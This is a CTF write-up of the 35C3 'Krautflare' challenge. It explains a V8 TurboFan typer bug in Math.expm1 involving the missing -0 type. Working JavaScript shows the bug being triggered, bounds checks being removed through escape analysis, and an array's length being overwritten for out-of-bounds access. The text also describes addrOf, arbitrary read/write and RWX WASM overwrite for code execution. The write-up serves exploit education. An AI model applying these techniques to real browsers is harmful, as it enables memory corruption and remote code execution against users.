Krautflare is a V8 challenge that appeared in the 35C3 CTF. This challenge exploits a bug related to the `Math.expm1` function. For more details, see the issue reported by Google Project Zero here: [Chrome: V8: incorrect type information on Math.expm1](https://bugs.chromium.org/p/project-zero/issues/detail?id=1710).

You can easily find the original challenge files online. To facilitate exploit development, I also rebuilt a debug version of V8, since the challenge only provides a release build. I won’t go over the build process again here. This is a quite hard challenge to trigger the bug, so this will be a difficult write-up. Okay, let’s start.

## Understanding the Bug

We all know that one of the most important parts of the analysis pipeline is the typer. JavaScript is a dynamic language, so knowing the types of data we can expect at runtime is important for optimization, because we want to optimize the code as much as possible. The role of the typer is to process nodes in the code’s intermediate representation and compute the possible output types based on the possible input types. For example, a common type is the range: if a node outputs Range(1, 3), it means it can have the values 1, 2, or 3.

Based on the bug report, we can see that the typer sets the type of `Math.expm1` to be `Union(PlainNumber, NaN)`. This causes the TurboFan optimizer to think that the output will either be a `PlainNumber` or a floating-point `NaN`. However, if we read the [types.h](https://source.chromium.org/chromium/v8/v8.git/+/9680338c622d4693f984b49fb24d101acd2d8112:src/compiler/types.h;l=109) source code, we can see that `PlainNumber` is defined as: `V(PlainNumber, kIntegral32 | kOtherNumber)`, it contains `PlainNumber = Integral32 ∪ OtherNumber`. So in fact, `PlainNumber` contains “normal” Number values, including 32-bit integers and other double values grouped under `OtherNumber`. This means `PlainNumber` does not contain `NaN` and `MinusZero`. Larger types like `OrderedNumber` or `Number` will contain these two values.

To sum up, `Math.expm1` is missing the `-0` type. Therefore, the typer makes a wrong assumption about the type. This type will then propagate to other operations, and maybe we can get a security-relevant incorrect optimization from it.

The question is: where can `-0` make a difference? The cases that can distinguish between `0` and `-0` are division, `atan2`, and `Object.is`. The typing code does not handle minus zero in the first two cases, so the only one left is `Object.is`. If we check whether the result of `Math.expm1` is `-0`, the typer thinks the answer will always be false, but it can be true or false at runtime.

We will now take a closer look at V8’s optimization mechanism. As i know, the typer runs three times:
- in the [typer](https://source.chromium.org/chromium/v8/v8.git/+/dde25872f58951bb0148cf43d6a504ab2f280485:src/compiler/typer.h) phase
- in the [TypeNarrowingReducer](https://source.chromium.org/chromium/v8/v8.git/+/dde25872f58951bb0148cf43d6a504ab2f280485:src/compiler/load-elimination.h) (load elimination phase)
- in the [simplified lowering](https://source.chromium.org/chromium/v8/v8.git/+/dde25872f58951bb0148cf43d6a504ab2f280485:src/compiler/simplified-lowering.h) phase

More specifically, it works like this:

![](turbo_pipeline.png)

The main point is that the typer runs multiple times in the pipeline, mixed with different optimization passes. If the typer discovers too early that we are comparing `Math.expm1` with `-0`, it will just fold the comparison into a constant `false` (we will see it more clearly later). This is not useful for us: the code becomes functionally incorrect, but it has no security impact. On the other hand, we also don’t want the typer to discover the `-0` comparison too late, because then we won’t get the incorrect optimization we are aiming for. 

The `Object.is` call initially appears as a `SameValue` node in the intermediate representation. In a pass called `TypedOptimization`, this `SameValue` node can be reduced to more specialized nodes (see `ReduceSameValue` in [typed-optimization.cc](https://source.chromium.org/chromium/v8/v8.git/+/dde25872f58951bb0148cf43d6a504ab2f280485:src/compiler/typed-optimization.cc;l=504)). 

In our case, since we are comparing the result of `Math.expm1` with `-0`, `TypedOptimization` will replace `SameValue` with the specialized `ObjectIsMinusZero`. Looking ahead, the typing pass where we actually get the bug is `SimplifiedLowering` ([simplified-lowering.cc](https://source.chromium.org/chromium/v8/v8.git/+/dde25872f58951bb0148cf43d6a504ab2f280485:src/compiler/simplified-lowering.cc;l=3079)). This is the third (and final) typing pass in the pipeline. It propagates type information for `SameValue` nodes, but not for specialized nodes like `ObjectIsMinusZero`. Since we need type propagation to trigger an incorrect optimization, we want to avoid this conversion to `ObjectIsMinusZero`. In other words, we don’t want the optimizer to realize too early that we are comparing with `-0`.

However, there is one more obstacle to overcome. With a naive approach, the graph will contain a `FloatExpm1` node. This node outputs a raw float, while the `SameValue` node expects a tagged value as input. Because of this mismatch, the compiler inserts a `ChangeFloat64ToTagged` node to perform the conversion. 

The problem is that, according to the type information, the input can never be `-0`. As a result, the generated code does not include special handling for minus zero, and any `-0` value will be truncated to a regular `0`. More concretely, the `Math.expm1` operation is lowered to a `FloatExpm1` node, which takes a float as input and produces a float. This value is then passed to `SameValue`. However, floats can be represented in two ways: as a raw float or as a tagged value (which can represent either a float or an object). Since `FloatExpm1` outputs a raw float and `SameValue` expects a tagged value, the compiler inserts a `ChangeFloat64ToTagged` node for the conversion.

Because the compiler assumes that the input to `ChangeFloat64ToTagged` can never be -0, it does not generate code to handle that case. At runtime, the `-0` produced by `Math.expm1` is therefore converted into `0`, breaking our attempt to exploit the bug.

`FloatExpm1` only accepts floats. However, if you call `Math.expm1("0")` (passing a string), you get `NaN` instead of an error. This means there must be a way to handle non-number inputs. The answer is that V8 provides a builtin implementation of `Math.expm1` that can handle all input types. If we can force TurboFan to use this builtin instead of lowering to `FloatExpm1`, we will get a `Call` node in the graph. The key difference is that a `Call` node already returns a tagged value, so there is no need for a `ChangeFloat64ToTagged` conversion. As a result, -0 will not be truncated to 0.

This is the incorrect optimization we are looking for. In JavaScript, array accesses are protected by `CheckBounds` nodes, which ensure the index stays within valid bounds. If the optimizer can prove that an index is always in-bounds, it will remove the `CheckBounds` node. Now, imagine tying the index to the result of `Object.is`. Because the typing information is incorrect, we can trick the analyzer into believing the index is always in-bounds, even though it can go out-of-bounds at runtime. As a result, the optimizer removes the `CheckBounds` check incorrectly, giving us out-of-bounds (OOB) access to a JavaScript array. From there, we can build more powerful exploitation primitives.

## Triggering the bug
This is the PoC from the bug report:
```js
function foo(){ 
    return Object.is(Math.expm1(-0), -0);
}

print("---- Before Optimization ----");
print(foo());

%OptimizeFunctionOnNextCall(foo);

print("---- After Optimization ----");
print(foo());
```
Run it with `d8 --allow-natives-syntax`. The first print will output true: the code is interpreted, so it works correctly. Then we optimize `foo`, and the output changes to false: the optimizer uses the incorrect type information and folds `Object.is` into the constant false.

![](miss_trigger.png)

Something is not right here: we cannot trigger it to become `false` after optimization. Even if this may not have any security impact, we should still be able to see the value change.

To investigate this, we need to use `Turbolizer` by adding the `--trace-turbo` flag. You will see a file named `turbo-foo-0.json`. Load it into `Turbolizer`.

Navigate to the `Typer` phase, and you will see that it is initialized as a `SameValue` node, as shown below.

![](turbo_expm1.1.png)

Then move to the `TypedLowering` phase, where `TypedOptimization` reduces the `SameValue` node to `ObjectIsMinusZero`, as expected.

![](turbo_expm1.2.png)

Next, move to the `SimplifiedLowering` phase. You will see a `FloatExpm1` node, which flows into `NumberIsMinusZero` and is then tagged with `ChangeBitToTagged`, as expected.

![](turbo_expm1.3.png)

However, looking at it like this, it’s hard to spot the issue. Click the **“T”** icon in the top-right corner to see more details about the types being used. You will see something like this:

![](turbo_expm1.4.png)

Now we can see the issue here. The type of `FloatExpm1` is `Number`, which includes `-0`. But according to the bug report, shouldn’t it be `PlainNumber` or `NaN`? It should have been buggy instead of behaving correctly. It turns out the answer lies in the `revert-bugfix-880207.patch` file, which reintroduces the bug. It only patches `typer.cc` (where the builtin is handled), but not `operation-typer.cc` (which handles operations with normal inputs). Therefore, the bug only appears when calling the `builtin`, not when using `FloatExpm1`.

I’m not sure whether this was intentional by the challenge author or not. However, we still need to call the `builtin` to avoid the `ChangeBitToTagged` node, so this does not affect our approach.

`FloatExpm1` is an optimized node for number inputs: the compiler assumes that the input will be a number. If it is indeed a number at runtime, execution stays in optimized code. If not, the optimized function bails out to the interpreter, a process known as deoptimization. The interpreter then uses the builtin, which can handle all input types. On the next compilation, TurboFan uses the feedback collected during execution and realizes that the input is not always a number. As a result, it generates a Call to the builtin instead of using FloatExpm1.

Let’s do exactly that. We’ll use loops to trigger compilation instead of relying on native syntax.

```js
function foo(x) {
    return Object.is(Math.expm1(x), -0);
}

foo(0);

for(let i = 0; i < 100000; i++)
    foo("0");
print(foo(-0));
```

This will print `false`. When you run it, you’ll notice that the function is compiled twice. You can add the `--trace-deopt` flag to observe when deoptimizations happen.

At first, foo runs in the interpreter. After some time, it gets compiled and optimistically optimized under the assumption that x is always a number. The first time the compiled function is called (with x as a string), we get a deoptimization. It updates the type feedback, telling TurboFan not to assume that x is always a number. The second time the function is compiled, TurboFan will generate a `Call` to the builtin instead of using `FloatExpm1`. However, you can see that sometimes it works, and sometimes it does not.

![](trigger_expm1.png)

You might ask what the purpose of `foo(0)` at the beginning is. Without this call, we cannot trigger the bug. I will talk about these issues at the end.

## Triggering the OOB

The idea is to make the array index depend on the result of `Object.is`, so that the analyzer assumes the index is always in-bounds. For example:
```js
function foo(x) {
    let a = [0.1, 0.2, 0.3, 0.4];
    let b = Object.is(Math.expm1(x), -0);
    return a[b * 1337];
}
```
Here we try to perform an OOB read, because it is easy to observe when it works. By changing the read into an assignment, this can easily become an OOB write.

- If `b` is false, we access index 0. The optimizer can prove this is in-bounds because the length of a is known.

- If `b` is true, we access index 1337, which is out-of-bounds. However, the optimizer thinks b can only be false, so it removes the bounds check.

On this example: b will clearly be folded into the constant `false` (just like in the PoC) because the typer discovers it too early. As a result, we will always access index `0`, and we cannot continue the exploitation.

Another approach is to add some indirection by making `-0` a parameter:
```js
function foo(x, y) {
    let a = [0.1, 0.2, 0.3, 0.4];
    let b = Object.is(Math.expm1(x), y);
    return a[b * 1337];
}
```
It no longer gets folded, but the bounds check is still not removed.

![](turbo_expm1.5.png)

We are keeping the `SameValue` node, but it is typed as `Boolean` instead of the singleton `false`. This means the analyzer thinks it can be either `true` or `false`.

This propagates forward and gives the index a `Range(0, 1337)`, which clearly prevents bounds check elimination.

Additionally, if we click the arrow in the top-right corner to inspect the input types, we can see that `y` is a `Parameter[2]` node with type `NotInternal`. This means the analyzer does not know the type of `y`. More importantly, it does not know that `y` is always `-0`.

![](turbo_expm1.6.png)

Now there are two problems we need to solve here. 

First one is, based on the pipeline described earlier, the last stage where `Object.is` can still be folded to `false` is the `Load Elimination` phase. The `ConstantFoldingReducer` will propagate `-0` constants, and `TypedOptimization` will reduce a `SameValue` node that compares against a constant `-0` into an `ObjectIsMinusZero` node. After that, `SimplifiedLowering` will fold the `ObjectIsMinusZero` node into the constant `false`. So we need to keep the `SameValue` node until the `SimplifiedLowering` phase. In other words, we do not want the analyzer to realize that we are comparing against `-0` too early.

The second problem is that we want the analyzer to realize we are comparing with `-0` before the final typing stage, which is the `SimplifiedLowering` phase. This means that at this point, the `SameValue` node should evaluate to the constant `false`, not just a generic `Boolean`. The `UpdateFeedbackType` is responsible for propagating type information from `SameValue` nodes, but it does not reduce them further. If `SameValue` does not become a constant, the bounds check cannot be eliminated.

This is a timing problem. We need to keep the `SameValue` node alive after the final reduction stage, but still make sure it is typed as the constant `false`, instead of a generic `Boolean`, during the final typing stage. The answer lies in the phase between these two stages: `Escape Analysis`.

Let’s briefly talk about [Escape Analysis](https://en.wikipedia.org/wiki/Escape_analysis). In simple terms, `Escape Analysis` checks whether an object “escape” the current scope (function). If it does not, the optimizer can convert heap allocations into stack allocations. Instead of keeping a full object on the heap (which is more expensive), the optimizer can break the object into individual values and store them directly on the stack. This is called *scalar replacement*. `Escape Analysis` is not something new, it is widely used in compilers.

To make it easier to understand, let’s look at the example below.

```js
function foo() {
  let o = {x: 1};
  return o.x;
}
```

Clearly, we can rewrite it as follows: 
```js
function foo() {          
  let o_x = 1;
  return o_x;
}

// or

function foo() {          
  return 1;
}
```

While o has to be a concrete heap allocation, o_x can be *dematerialized* and turned into a stack or register variable (which is more efficient), or even constant-folded directly into the return value. This is exactly what `Escape Analysis` does.

For example, if we add a function call with object o as an argument:

```js
function foo() {
  let o = {x: 1};
  boo(0);
  return o.x;
}
```

The optimization is no longer valid, because `boo()` could save a reference to o in a global variable. Therefore, we can’t transform o in a stack allocation. We say that o has escaped the scope of `foo()`. The goal of `Escape Analysis` is to identify which objects escape, so that the non-escaping ones can be dematerialized.

Until `Escape Analysis` runs, the analyzer sees o.x as an access to the x field through an object reference. It does not know much about its type, because it cannot make any assumptions about o. 

Back to the main problem: if we hide `-0` inside an object, the analyzer will not know that it is a constant `-0`, because the reduction phase happens before `Escape Analysis` phase. As a result, `TypedOptimization` will keep the `SameValue` node. Then `Escape Analysis` sees that o does not escape, dematerializes it, and propagates the constant. This gives us a `SameValue` node comparing against constant `-0` before `SimplifiedLowering` phase. Finally, the last typing run determines that `SameValue` is always false and propagates this information, which leads to the bounds check being removed. One small note, this challenge uses an old V8 version, before typer hardening was added, so we do not need to bypass it.

And we will get OOB access.

```js
function foo(x) {
    let a = [1.1, 1.2, 1.3, 1.4];
    let o = {mz: -0};
    let b = Object.is(Math.expm1(x), o.mz);
    return a[b*7];
}

foo(0);

for(let i = 0; i < 100000; i++)
    foo("0");
print(foo(-0));
```
If you run the code, it’ll return “strange” values because it is reading memory from the heap past the array bounds.

```bash
./d8 exploit1.js 
8.487983164e-314
```

## Building the primitives
Now we will start building the basic primitives, and from there we will build arbitrary read/write. The two most basic primitives are `AddrOf` and `FakeObj`. 

![](35c3-krautflare-prims.png)

To build `AddrOf`, we need a place to store an object and then read its address from there. In my previous write-ups, I used an element of an object array to store the object. However, this time I will store it in the in-object properties of an object. This detail is not very important; you can choose either approach.

However, to build `AddrOf` and arbitrary read/write, we need one more step: creating an array with a very large length. This is because we should not rely too much on the original OOB array.

There are two ways to do this: using `FakeObj`, or overwriting the length of a JSArray. The initial OOB bug can be used to build either one. In this write-up, I will use the second approach. 

Next, we need to build two stronger primitives: arbitrary read and arbitrary write. Reading values from an object alone is not enough for exploitation. We need the ability to read from and write to arbitrary memory addresses. Together with `AddrOf`, these primitives allow us to fully exploit the bug.

There are two ways to build arbitrary read/write. As we know, `JSTypedArray` and `JSArrayBuffer` work together as a pair. `JSArrayBuffer` stores the raw data, while `JSTypedArray` acts as a view that lets us interact with that raw data.

`JSTypedArray` contains a base pointer and an external pointer that point to the raw data region. `JSArrayBuffer`, on the other hand, contains a backing_store pointer that references the same region. 
This gives us two possible approaches: either overwrite the external pointer with 0 and control the base pointer so it points to the memory region we want to read or write, or overwrite the backing_store pointer to achieve the same effect. In my previous blog, I used the first approach. This time, however, I will use the second one. Because it seems that in this old version, the base pointer and external pointer may not exist yet.

This is the overall picture:

![](35c3-krautflare-flow.png)

Okay, the first step is to use the OOB bug to create an OOB array. This code will achieve our goal.

```js
let buf = new ArrayBuffer(8);
let f64_buf = new Float64Array(buf);
let u64_buf = new BigUint64Array(buf);

function gc() {
    for (var i = 0; i < 0x10000; ++i)
        var a = new ArrayBuffer();
}

function ftoi(val) {
    f64_buf[0] = val;
    return u64_buf[0];
}

function itof(val) {
    u64_buf[0] = val;
    return f64_buf[0];
}

function hex_padleft(val){
    return "0x" + val.toString(16).padStart(16, "0")
}

function hex(val){
    return "0x" + val.toString(16)
}

function hex_padright(val){
    return "0x" + val.toString(16).padEnd(16, "0")
}


function foo(x) {
    let o = {mz: -0};
    let b = Object.is(Math.expm1(x), o.mz);

    let a = [0.1, 0.2, 0.3, 0.4]; // origin array
    let arrs = [0.4, 0.5]; // OOB array
    
    let new_size = itof(0x7fffffff00000000n);
    for (let i = 4; i < 20; i++) {
        let val = a[b*i];
        let is_backing = a[b*(i+1)] === 0.4;
        let orig_size = hex_padleft(ftoi(val));
        let good = (orig_size === "0x0000000200000000" && !is_backing);
        a[b*i*good] = new_size;
        if (good)
            break;
    }

    return arrs;
    
}

foo(0);

for(let i = 0; i < 10000; i++)
    foo("0");

let oob_arr = foo(-0);              
```

Looking at the code, we can see that it overwrites the length field we want. Otherwise, it writes to `a[0]`. You may wonder why we do not only overwrite it at the end, instead of writing repeatedly. The reason is that if we only overwrite it on the final iteration, the bug will not be triggered inside the if statement. In other words, the CheckBounds node will not be removed. Any branch that depends on the condition flag can affect the optimization flow, making the optimizer more suspicious and preventing it from removing the `CheckBound` node. Instead, the code must be structured in a more “pure mathematical” way to trick the optimizer. You can verify this with `--allow-natives-syntax` flag on the debug build and see that the object’s length has been modified.

Next, we will build `AddrOf` and arbitrary read/write. However, my approach is different from the write-up I used as a reference (I will put the link at the end). My goal is to move the objects into Old Space to make the layout more stable. Because of that, my code is different from the original write-up. I tuned the code so that unnecessary objects are dereferenced. I only create the `JSObject` and `JSArrayBuffer` once, then move all of them into Old Space. After that, I calculate their indexes relative to our OOB array.

This is the code that does what we need.

## RCE
To achieve RCE, I use the technique of overwriting the WASM code page. Since WASM is also JIT-compiled, its memory pages are marked as Read-Write-Execute (RWX). There is a `write-protect flag` for WASM, but it was disabled by default at the time because of [asm.js](http://asmjs.org/spec/latest/), as explained by [Johnathan Norman](https://twitter.com/spoofyroot/status/1379911787282243584). The main reason was simply backward compatibility at the time. For a more detailed explanation of each section, I suggest reading the “[Introduction to WebAssembly](https://rsms.me/wasm-intro)” article.

In newer versions, this flag is enabled again. However, with arbitrary write, we can simply disable it ourselves.

## Problems about Math.Expm1 
Now we get to the part where I will try to explain some problems about `Math.Expm1`.

### The Triggering Problem

A piece of code that triggers the bug is provided.

```js
function foo(x) {
    return Object.is(Math.expm1(x), -0);
}
foo(0);
for(let i = 0; i < 100000; i++)
    foo("0");
console.log(foo(-0)); //false
```

The author is not sure why `foo(0)` is required, since things do not work if we delete this. The first thing I thought about was inline caching. However, if we move `foo(0)` to the end, the bug can still be triggered.

```js
function foo(x) {
    return Object.is(Math.expm1(x), -0);
}

for(let i = 0; i < 100000; i++)
    foo("0");
console.log(foo(-0)); //false
foo(0)
```

If we separate the loop, the bug can be triggered.

```js
for(let i = 0; i < 50000; i++)
    foo("0");
for(let i = 0; i < 50000; i++)
    foo("0");
console.log(foo(-0)); //false
```

If we force the second optimization, bug can also be triggered.

```js
for(let i = 0; i < 100000; i++)
    foo("0");
%OptimizeFunctionOnNextCall(foo);
console.log(foo(-0)); //false
```

I noticed that successful bug triggers require a second optimization. You can verify this with the `--trace-turbo` flag: when `turbo-foo-1.json` appears, the bug gets triggered.

So the most reasonable explanation I could come up with is this: because `Math.expm1` is fundamentally a math function, the optimizer naively prefers optimizing it into nodes specialized for numeric operations, even though the earlier calls did not necessarily use numbers. After optimization, once the function receives a non-number input, deoptimization happens. At that point, the optimizer has enough feedback information to perform a second optimization pass using the builtin version instead.

However, there also needs to be some kind of side effect for the engine to actually perform this second optimization. Otherwise, after the first deoptimization, execution simply falls back to bytecode without reoptimize again.

### The Array Length Problem

As mentioned above, this code allows us to access data outside the array.

```js
function foo(x) {
    let a = [1.1, 1.2, 1.3, 1.4];
    let o = {mz: -0};
    let b = Object.is(Math.expm1(x), o.mz);
    return a[b*7];
}

foo(0);

for(let i = 0; i < 100000; i++)
    foo("0");
print(foo(-0));
```

However, if array a only has one or two elements, we cannot get OOB access. 

For example, with `a = [1.1, 1.2]`, the result is `1.2`. If we inspect it in Turbolizer at the `SimplifiedLowering` phase, we will see the following:

![](35c3_pro1.png)

With the appearance of the `Select` node, it is equivalent to a ternary operator. This means that instead of accessing the array normally, the code is optimized into an `if-else` statement. Based on the nodes around the Select node, we can read it as follows: `Word32Equal(0) ? 1.1 : 1.2`. We can translate it into pseudo-code as:

```js
res = Object.is(Math.expm1(x), -0);
tmp = res * 7;
return tmp == 0 ? 1.1 : 2.2;
```

This leads to the result where, even though tmp is not 0 (tmp = 7), the hardcoded ternary expression still only returns 1.2, even though the `CheckBounds` node has already been removed.

The result is similar when the array only has one element. In that case, it returns the value directly without generating any array access code, so we cannot exploit it even though the `CheckBounds` node is still removed. The pseudo-code in this case looks like this:

```js
res = Object.is(Math.expm1(x), -0);
tmp = res * 7;
return 1.1;
```

However, not every case behaves like this. Still, we should intentionally add more elements to the array to avoid the optimizer turning it into conditional expressions or directly returning values.
